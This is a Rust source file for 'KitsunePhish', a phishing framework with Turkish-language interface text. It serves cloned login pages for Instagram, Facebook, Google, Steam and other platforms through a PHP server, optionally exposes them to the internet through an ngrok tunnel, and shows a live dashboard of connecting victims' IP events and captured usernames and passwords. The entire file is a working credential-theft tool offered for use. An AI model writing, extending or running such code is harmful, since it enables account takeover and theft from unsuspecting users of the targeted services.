use colored::*;
use crossterm::{
    event::{self, DisableMouseCapture, EnableMouseCapture, Event, KeyCode},
    execute,
    terminal::{disable_raw_mode, enable_raw_mode, EnterAlternateScreen, LeaveAlternateScreen},
};
use inquire::Select;
use ratatui::{
    backend::CrosstermBackend,
    layout::{Alignment, Constraint, Direction, Layout},
    style::{Color, Modifier, Style},
    text::{Line, Span},
    widgets::{Block, Borders, List, ListItem, Paragraph},
    Terminal,
};
use std::{
    fs, io,
    path::Path,
    process::{Child, Command, Stdio},
    sync::{Arc, Mutex},
    thread,
    time::{Duration, Instant},
};

const MAIN_BANNER: &str = r#"
██ ▄█▀ ██▓▄▄▄█████▓  ██████  █    ██  ███▄    █ ▓█████ 
 ██▄█▒ ▓██▒▓  ██▒ ▓▒▒██    ▒  ██  ▓██▒ ██ ▀█   █ ▓█   ▀ 
▓███▄░ ▒██▒▒ ▓██░ ▒░░ ▓██▄    ▓██  ▒██░▓██  ▀█ ██▒▒███   
▓██ █▄ ░██░░ ▓██▓ ░   ▒   ██▒▓▓█  ░██░▓██▒  ▐▌██▒▒▓█  ▄ 
▒██▒ █▄░██░  ▒██▒ ░ ▒██████▒▒▒▒█████▓ ▒██░   ▓██░░▒████▒
"#;

struct KitsuneApp {
    logs: Vec<String>,
    debug_info: Vec<String>,
    ips: Vec<String>,
    creds: Vec<String>,
    ngrok_url: String,
    platform: String,
}

fn main() -> Result<(), io::Error> {
    // 1. AÇILIŞ VE SEÇİM EKRANI
    print!("{}[2J{}[1;1H", 27 as char, 27 as char); 
    println!("{}", MAIN_BANNER.red().bold());
    println!("{}", "--- KitsunePhish Framework Başlatılıyor ---".cyan());

    let platforms = vec![
        "instagram", "facebook", "twitter", "snapchat", "pinterest", "discord", "spotify", "steam", "google",
    ];

    let site_choice = Select::new("Hedef Platformu Belirleyin:", platforms).prompt().unwrap();
    let tunnel_choice = Select::new("Bağlantı Yöntemi:", vec!["Localhost", "ngrok"]).prompt().unwrap();

    // 2. HAZIRLIK VE SERVİSLER
    let www_dir = ".server/www";
    let mut startup_debug = Vec::new();

    if !Path::new(".server").exists() { fs::create_dir(".server")?; }
    if !Path::new("auth").exists() { fs::create_dir("auth")?; }
    
    let _ = fs::remove_dir_all(www_dir);
    fs::create_dir_all(www_dir)?;

    let site_src = format!(".sites/{}", site_choice);
    if Path::new(&site_src).exists() {
        startup_debug.push(format!("[DEBUG] Kaynak dizin: {}", site_src));
        let _ = Command::new("sh")
            .arg("-c")
            .arg(format!("cp -rf {}/* {}/", site_src, www_dir))
            .status();
    }

    if Path::new(".sites/ip.php").exists() {
        let _ = fs::copy(".sites/ip.php", format!("{}/ip.php", www_dir));
    }

    // PHP'yi Başlat
    let _php_proc = Command::new("php")
        .args(["-S", "0.0.0.0:8080", "-t", www_dir])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()?;
    
    startup_debug.push("[DEBUG] PHP sunucusu 8080 portunda aktif.".to_string());

    let mut _ngrok_proc: Option<Child> = None;
    let mut current_url = "http://localhost:8080".to_string();

    if tunnel_choice == "ngrok" {
        startup_debug.push("[DEBUG] ngrok tüneli açılıyor...".to_string());
        _ngrok_proc = Command::new("ngrok")
            .args(["http", "8080"])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()
            .ok();
        
        thread::sleep(Duration::from_secs(3));
        if let Ok(res) = reqwest::blocking::get("http://127.0.0.1:4040/api/tunnels") {
            if let Ok(json) = res.json::<serde_json::Value>() {
                if let Some(url) = json["tunnels"][0]["public_url"].as_str() {
                    current_url = url.to_string();
                }
            }
        }
    }

    // 3. TUI MODU
    enable_raw_mode()?;
    let mut stdout = io::stdout();
    execute!(stdout, EnterAlternateScreen, EnableMouseCapture)?;
    let backend = CrosstermBackend::new(stdout);
    let mut terminal = Terminal::new(backend)?;

    let app_state = Arc::new(Mutex::new(KitsuneApp {
        logs: vec![format!("{} platformu aktif edildi.", site_choice)],
        debug_info: startup_debug,
        ips: vec![],
        creds: vec![],
        ngrok_url: current_url,
        platform: site_choice.to_string(),
    }));

    let tick_rate = Duration::from_millis(250);
    let mut last_tick = Instant::now();

    loop {
        let mut app = app_state.lock().unwrap();
        let ip_file = format!("{}/ip.txt", www_dir);
        let cred_file = format!("{}/usernames.txt", www_dir);

        if Path::new(&ip_file).exists() {
            if let Ok(content) = fs::read_to_string(&ip_file) {
                if !content.trim().is_empty() {
                    let now = chrono::Local::now().format("%H:%M:%S").to_string();
                    app.ips.push(format!("[{}] Bağlantı algılandı", now));
                    app.logs.push(format!("Kurban bağlandı: {}", now));
                    let _ = fs::write(&ip_file, "");
                }
            }
        }
        if Path::new(&cred_file).exists() {
            if let Ok(content) = fs::read_to_string(&cred_file) {
                if !content.trim().is_empty() {
                    let now = chrono::Local::now().format("%H:%M:%S").to_string();
                    app.creds.push(format!("[{}] {}", now, content.trim().replace("Username: ", "U:").replace("Pass: ", "P:")));
                    app.logs.push("HESAP VERİSİ YAKALANDI!".to_string());
                    let _ = fs::write(&cred_file, "");
                }
            }
        }

        terminal.draw(|f| {
            let area = f.size();
            let chunks = Layout::default()
                .direction(Direction::Vertical)
                .margin(0)
                .constraints([
                    Constraint::Length(7),
                    Constraint::Percentage(35),
                    Constraint::Min(5),
                    Constraint::Length(3),
                ])
                .split(area);

            // DIYAGONAL GRADYAN BANNER + ORTALAMA
            let banner_lines: Vec<Line> = MAIN_BANNER.lines().enumerate().map(|(y, line)| {
                let spans: Vec<Span> = line.chars().enumerate().map(|(x, c)| {
                    let factor = (x + y * 4) as f32 / 60.0;
                    let r = 255;
                    let g = (165.0 * factor.min(1.0)) as u8;
                    let b = 0;
                    Span::styled(c.to_string(), Style::default().fg(Color::Rgb(r, g, b)))
                }).collect();
                Line::from(spans)
            }).collect();

            // Paragraph'ı Alignment::Center ile render ediyoruz
            f.render_widget(
                Paragraph::new(banner_lines)
                    .alignment(Alignment::Center), 
                chunks[0]
            );

            let mid_chunks = Layout::default()
                .direction(Direction::Horizontal)
                .constraints([Constraint::Percentage(35), Constraint::Percentage(65)])
                .split(chunks[1]);

            let ip_items: Vec<ListItem> = app.ips.iter().rev().take(15).map(|v| ListItem::new(v.as_str()).style(Style::default().fg(Color::Cyan))).collect();
            f.render_widget(List::new(ip_items).block(Block::default().title(" IP TAKİBİ ").borders(Borders::ALL)), mid_chunks[0]);

            let debug_items: Vec<ListItem> = app.debug_info.iter().chain(app.logs.iter()).rev().take(15).map(|l| {
                let color = if l.contains("ERROR") || l.contains("CRITICAL") { Color::Red } else if l.contains("DEBUG") { Color::Yellow } else { Color::White };
                ListItem::new(l.as_str()).style(Style::default().fg(color))
            }).collect();
            f.render_widget(List::new(debug_items).block(Block::default().title(" SİSTEM LOGLARI ").borders(Borders::ALL)), mid_chunks[1]);

            let cred_items: Vec<ListItem> = app.creds.iter().rev().map(|v| ListItem::new(v.as_str()).style(Style::default().fg(Color::Green).add_modifier(Modifier::BOLD))).collect();
            f.render_widget(List::new(cred_items).block(Block::default().title(" YAKALANAN HESAP BİLGİLERİ ").borders(Borders::ALL)), chunks[2]);

            let footer = Paragraph::new(format!(" PHISH URL: {} | Kapatmak için 'q'", app.ngrok_url))
                .style(Style::default().fg(Color::Yellow).add_modifier(Modifier::BOLD))
                .block(Block::default().borders(Borders::ALL));
            f.render_widget(footer, chunks[3]);
        })?;

        if event::poll(Duration::from_millis(100))? {
            if let Event::Key(key) = event::read()? {
                if key.code == KeyCode::Char('q') { break; }
            }
        }
        if last_tick.elapsed() >= tick_rate { last_tick = Instant::now(); }
    }

    let _ = Command::new("pkill").arg("-f").arg("php -S").status();
    let _ = Command::new("pkill").arg("-f").arg("ngrok").status();
    disable_raw_mode()?;
    execute!(terminal.backend_mut(), LeaveAlternateScreen, DisableMouseCapture)?;
    terminal.show_cursor()?;
    Ok(())
}
